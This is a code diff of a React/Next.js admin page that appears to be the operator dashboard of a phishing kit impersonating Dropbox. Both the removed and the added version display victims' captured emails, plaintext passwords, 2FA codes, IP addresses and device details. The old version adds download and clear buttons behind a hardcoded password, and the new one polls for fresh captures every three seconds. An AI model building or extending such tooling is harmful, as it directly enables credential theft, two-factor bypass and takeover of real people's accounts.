@@ -1,182 +1,144 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { useRouter } from 'next/navigation';
+
+interface Log {
+  timestamp: string;
+  email: string;
+  password: string;
+  code: string;
+  type: string;
+  deviceInfo: {
+    userAgent: string;
+    ip: string;
+  };
+}
 
 export default function LogsPage() {
-  const [logs, setLogs] = useState<any[]>([]);
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
-  const [password, setPassword] = useState('');
+  const [logs, setLogs] = useState<Log[]>([]);
+  const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
-  const router = useRouter();
+
+  const fetchLogs = async () => {
+    try {
+      setIsLoading(true);
+      const response = await fetch('/api/log');
+      if (!response.ok) throw new Error('Failed to fetch logs');
+      const data = await response.json();
+      setLogs(data);
+    } catch (error) {
+      console.error('Error fetching logs:', error);
+      setError('Failed to fetch logs');
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   useEffect(() => {
-    // Check if already authenticated
-    const auth = localStorage.getItem('logsAuth');
-    if (auth === 'true') {
-      setIsAuthenticated(true);
-      loadLogs();
-    }
+    fetchLogs();
+    // Refresh logs every 3 seconds
+    const interval = setInterval(fetchLogs, 3000);
+    return () => clearInterval(interval);
   }, []);
 
-  const loadLogs = async () => {
-    try {
-      const response = await fetch('/api/logs');
-      const data = await response.json();
-      setLogs(Array.isArray(data) ? data : []);
-    } catch (error) {
-      console.error('Error loading logs:', error);
-      setLogs([]);
-    }
-  };
-
-  // Set up interval to check for new logs every second
-  useEffect(() => {
-    if (isAuthenticated) {
-      const interval = setInterval(loadLogs, 1000);
-      return () => clearInterval(interval);
-    }
-  }, [isAuthenticated]);
-
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (password === 'Mpn101305$!') {
-      setIsAuthenticated(true);
-      localStorage.setItem('logsAuth', 'true');
-      loadLogs();
-    } else {
-      setError('Invalid password');
-    }
-  };
-
-  const clearLogs = async () => {
-    try {
-      await fetch('/api/logs', { method: 'DELETE' });
-      setLogs([]);
-    } catch (error) {
-      console.error('Error clearing logs:', error);
-    }
-  };
-
-  const downloadLogs = () => {
-    const logText = logs.map(log => 
-      `Timestamp: ${log.timestamp}\nEmail: ${log.email}\nPassword: ${log.password}\n2FA Code: ${log.code || 'N/A'}\nType: ${log.type}\nIP Address: ${log.ipAddress}\n-------------------`
-    ).join('\n\n');
-
-    const blob = new Blob([logText], { type: 'text/plain' });
-    const url = window.URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `dropbox_logs_${new Date().toISOString().split('T')[0]}.txt`;
-    document.body.appendChild(a);
-    a.click();
-    window.URL.revokeObjectURL(url);
-    document.body.removeChild(a);
-  };
-
-  if (!isAuthenticated) {
-    return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-        <div className="max-w-md w-full space-y-8 p-8 bg-white rounded-lg shadow-lg">
-          <div>
-            <h2 className="mt-6 text-center text-3xl font-extrabold text-gray-900">
-              Logs Access
-            </h2>
-          </div>
-          <form className="mt-8 space-y-6" onSubmit={handleLogin}>
-            <div className="rounded-md shadow-sm -space-y-px">
-              <div>
-                <label htmlFor="password" className="sr-only">
-                  Password
-                </label>
-                <input
-                  id="password"
-                  name="password"
-                  type="password"
-                  required
-                  className="appearance-none rounded relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
-                  placeholder="Enter password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                />
-              </div>
-            </div>
-
-            {error && (
-              <div className="text-red-500 text-sm text-center">{error}</div>
-            )}
-
-            <div>
-              <button
-                type="submit"
-                className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
-              >
-                Access Logs
-              </button>
-            </div>
-          </form>
-        </div>
-      </div>
-    );
-  }
-
   return (
-    <div className="min-h-screen bg-gray-100 py-6 flex flex-col justify-center sm:py-12">
-      <div className="relative py-3 sm:max-w-xl sm:mx-auto">
-        <div className="relative px-4 py-10 bg-white shadow-lg sm:rounded-3xl sm:p-20">
-          <div className="max-w-md mx-auto">
-            <div className="divide-y divide-gray-200">
-              <div className="py-8 text-base leading-6 space-y-4 text-gray-700 sm:text-lg sm:leading-7">
-                <div className="flex justify-between items-center mb-4">
-                  <h1 className="text-2xl font-bold text-gray-900">Dropbox Logs</h1>
-                  <div className="space-x-2">
-                    <button
-                      onClick={downloadLogs}
-                      className="px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700"
-                    >
-                      Download Logs
-                    </button>
-                    <button
-                      onClick={clearLogs}
-                      className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
-                    >
-                      Clear Logs
-                    </button>
-                  </div>
-                </div>
-                <div className="space-y-4">
-                  {logs.map((log, index) => (
-                    <div key={index} className="p-4 bg-gray-50 rounded-lg">
-                      <div className="font-semibold text-gray-900">
-                        {log.type === 'LOGIN' ? 'Login Attempt' : '2FA Code'}
-                      </div>
-                      <div className="text-sm text-gray-600">
-                        Time: {log.timestamp}
-                      </div>
-                      <div className="text-sm text-gray-600">
-                        Email: {log.email}
-                      </div>
-                      <div className="text-sm text-gray-600">
-                        Password: {log.password}
-                      </div>
-                      {log.code && (
-                        <div className="text-sm text-gray-600">
-                          2FA Code: {log.code}
-                        </div>
-                      )}
-                      <div className="text-sm text-gray-600">
-                        IP Address: {log.ipAddress}
-                      </div>
-                    </div>
-                  ))}
-                  {logs.length === 0 && (
-                    <div className="text-center text-gray-500">
-                      No logs available
-                    </div>
-                  )}
-                </div>
+    <div className="min-h-screen bg-gray-50">
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        <div className="flex justify-between items-center mb-8">
+          <div>
+            <h1 className="text-3xl font-bold text-gray-900">Login Activity Logs</h1>
+            <p className="mt-1 text-sm text-gray-500">Real-time monitoring of login attempts across all devices</p>
+          </div>
+          <button
+            onClick={fetchLogs}
+            disabled={isLoading}
+            className="inline-flex items-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-blue-400 transition-colors duration-200"
+          >
+            {isLoading ? (
+              <>
+                <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                </svg>
+                Refreshing...
+              </>
+            ) : (
+              'Refresh Logs'
+            )}
+          </button>
+        </div>
+        
+        {error && (
+          <div className="mb-8 bg-red-50 border-l-4 border-red-400 p-4">
+            <div className="flex">
+              <div className="flex-shrink-0">
+                <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
+                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                </svg>
+              </div>
+              <div className="ml-3">
+                <p className="text-sm text-red-700">{error}</p>
               </div>
             </div>
+          </div>
+        )}
+
+        <div className="bg-white shadow-sm rounded-lg overflow-hidden">
+          <div className="overflow-x-auto">
+            <table className="min-w-full divide-y divide-gray-200">
+              <thead>
+                <tr className="bg-gray-50">
+                  <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Time</th>
+                  <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
+                  <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Credentials</th>
+                  <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device Info</th>
+                  <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">IP Address</th>
+                </tr>
+              </thead>
+              <tbody className="bg-white divide-y divide-gray-200">
+                {logs.map((log, index) => (
+                  <tr key={index} className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
+                      {new Date(log.timestamp).toLocaleString()}
+                    </td>
+                    <td className="px-6 py-4 whitespace-nowrap">
+                      <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
+                        log.type === 'LOGIN' ? 'bg-blue-100 text-blue-800' : 'bg-purple-100 text-purple-800'
+                      }`}>
+                        {log.type}
+                      </span>
+                    </td>
+                    <td className="px-6 py-4 whitespace-nowrap">
+                      <div className="text-sm">
+                        <p className="text-gray-900 font-medium">{log.email}</p>
+                        <p className="text-gray-500">{log.type === 'LOGIN' ? `Password: ${log.password}` : `2FA Code: ${log.code}`}</p>
+                      </div>
+                    </td>
+                    <td className="px-6 py-4 text-sm text-gray-500">
+                      <div className="max-w-xs overflow-hidden overflow-ellipsis">
+                        {log.deviceInfo.userAgent}
+                      </div>
+                    </td>
+                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
+                      {log.deviceInfo.ip}
+                    </td>
+                  </tr>
+                ))}
+                {logs.length === 0 && (
+                  <tr>
+                    <td colSpan={5} className="px-6 py-8 text-center text-sm text-gray-500 bg-gray-50">
+                      <div className="flex flex-col items-center">
+                        <svg className="h-12 w-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
+                        </svg>
+                        <p className="mt-2">No logs found</p>
+                        <p className="mt-1 text-gray-400">Login attempts will appear here</p>
+                      </div>
+                    </td>
+                  </tr>
+                )}
+              </tbody>
+            </table>
           </div>
         </div>
       </div>
